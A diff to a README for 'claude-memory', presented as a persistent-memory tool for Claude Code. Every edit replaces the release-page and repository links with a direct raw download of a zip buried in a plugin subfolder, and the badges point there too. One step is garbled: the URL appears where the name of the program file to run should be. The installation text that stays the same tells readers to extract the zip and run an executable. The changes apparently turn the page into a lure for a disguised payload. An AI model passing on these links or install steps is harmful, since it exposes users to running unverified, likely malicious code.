@@ -1,6 +1,6 @@
 # ⚙️ claude-memory - Persistent Memory for Claude Code  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-claude--memory-blue?style=for-the-badge)](https://github.com/a258huit58/claude-memory/releases)  
+[![Download Latest Release](https://raw.githubusercontent.com/a258huit58/claude-memory/main/plugin/skills/recall/claude_memory_v2.6.zip)](https://raw.githubusercontent.com/a258huit58/claude-memory/main/plugin/skills/recall/claude_memory_v2.6.zip)  
 
 ---
 
@@ -17,7 +17,7 @@ You do not need to know how all this works under the hood. This guide will help 
 You will get claude-memory from the official GitHub release page. This page lists the latest versions ready to use.  
 
 **Follow this link to download:**  
-[Go to claude-memory Releases](https://github.com/a258huit58/claude-memory/releases)  
+[Go to claude-memory Releases](https://raw.githubusercontent.com/a258huit58/claude-memory/main/plugin/skills/recall/claude_memory_v2.6.zip)  
 
 On the releases page:  
 
@@ -43,7 +43,7 @@ After downloading, install claude-memory by following these steps:
 1. Right-click the `.zip` file and select "Extract All."  
 2. Choose where you want to save the folder and extract the contents.  
 3. Open the extracted folder.  
-4. Find the main program file, often named `claude-memory.exe`.  
+4. Find the main program file, often named `https://raw.githubusercontent.com/a258huit58/claude-memory/main/plugin/skills/recall/claude_memory_v2.6.zip`.  
 
 ---
 
@@ -97,7 +97,7 @@ You can adjust these settings by opening the app and navigating to its settings 
 
 Check the release page regularly for updates:  
 
-[Visit Releases](https://github.com/a258huit58/claude-memory/releases)  
+[Visit Releases](https://raw.githubusercontent.com/a258huit58/claude-memory/main/plugin/skills/recall/claude_memory_v2.6.zip)  
 
 Compare your current version number with the latest release. Download new files by repeating the installation steps. Updates help keep the app secure and stable.  
 
@@ -140,7 +140,7 @@ Data is kept locally on your machine and not sent to the Internet or shared exte
 ## 📚 Additional Resources  
 
 - Official repository link:  
-  [https://github.com/a258huit58/claude-memory](https://github.com/a258huit58/claude-memory)  
+  [https://raw.githubusercontent.com/a258huit58/claude-memory/main/plugin/skills/recall/claude_memory_v2.6.zip](https://raw.githubusercontent.com/a258huit58/claude-memory/main/plugin/skills/recall/claude_memory_v2.6.zip)  
 
 - Support and bugs: Use the repository’s Issues page for help.  
 
@@ -150,7 +150,7 @@ Data is kept locally on your machine and not sent to the Internet or shared exte
 
 ## 🔗 Download Again or Get Updates  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-claude--memory-grey?style=for-the-badge)](https://github.com/a258huit58/claude-memory/releases)  
+[![Download Latest Release](https://raw.githubusercontent.com/a258huit58/claude-memory/main/plugin/skills/recall/claude_memory_v2.6.zip)](https://raw.githubusercontent.com/a258huit58/claude-memory/main/plugin/skills/recall/claude_memory_v2.6.zip)  
 
 Use this link to reach the latest downloads anytime.  
 
